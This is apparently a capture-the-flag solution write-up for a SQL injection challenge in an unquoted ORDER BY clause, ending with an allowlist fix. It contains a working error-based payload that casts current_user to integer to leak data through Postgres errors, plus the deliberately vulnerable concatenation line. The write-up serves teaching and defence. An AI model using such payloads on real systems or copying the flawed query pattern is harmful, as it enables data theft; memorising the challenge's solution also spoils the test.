# Solution — sqli-order-by-numeric

## What tipped you off

`/archive?sort=N` changes the row order, so `sort` clearly reaches SQL. A single
quote does not produce a clean injection (no string literal to escape), but a
bare number does something a normal column reference should not — you can put an
_expression_ there, and the app echoes Postgres errors verbatim.

## The class of bug

SQL injection (CWE-89, OWASP A03:2021) in an **unquoted `ORDER BY` context**.
Because the value is not inside quotes, the exploit is not "break out of a string"
— it is "supply a SQL expression where a column ordinal was expected." Combined
with verbose errors, a type-cast failure becomes a value oracle.

## Vulnerability

`src/app.py`, `/archive`:

```python
sql = "SELECT title, author, published FROM posts ORDER BY " + sort + " ASC"
```

`sort` comes straight from the query string with no quoting, parameterization, or
numeric allowlist.

## Why it exists / Why the developer wrote it this way

You cannot bind a column position or an `ORDER BY` direction as a normal SQL
parameter — placeholders only work for _values_, not identifiers or clause
fragments — so developers who reach for "just concatenate it, it's only a number"
end up here. It passes every test where `sort` really is `1`, `2`, or `3`.

## Why it exists (side-channel)

The app returns the raw Postgres error text. Postgres reports the offending value
in a failed text→integer cast, which turns "make the query error" into "make the
query error _with the data I want inside the message_."

## The mechanical exploit / Exploit walkthrough

Send an `ORDER BY` expression that casts `current_user` (a name/text value) to an
integer — the cast fails and the value appears in the error:

```
GET /archive?sort=CAST(current_user||''%20AS%20integer)
-> 500 DB error: ... invalid input syntax for type integer: "bloguser" ...
```

Read `bloguser` out of the error, then:

```
GET /solve?user=bloguser   ->   FLAG{...}
```

`tests/exploit.py` performs exactly this and asserts the flag matches the
HMAC-derived expected value. A boolean/CASE variant
(`ORDER BY (CASE WHEN (1=1) THEN title ELSE author END)`) is a good exercise for
proving conditional control without the error channel.

## Fix

Never concatenate into `ORDER BY`. Map the user input to a fixed allowlist of
sortable columns and a validated direction:

```python
COLUMNS = {"1": "title", "2": "author", "3": "published"}
col = COLUMNS.get(sort, "published")
sql = f"SELECT title, author, published FROM posts ORDER BY {col} ASC"  # col is from a trusted set
```

Because `col` can only ever be one of three server-chosen identifiers, attacker
input can no longer reach the query as code. Also stop echoing raw database
errors to clients.
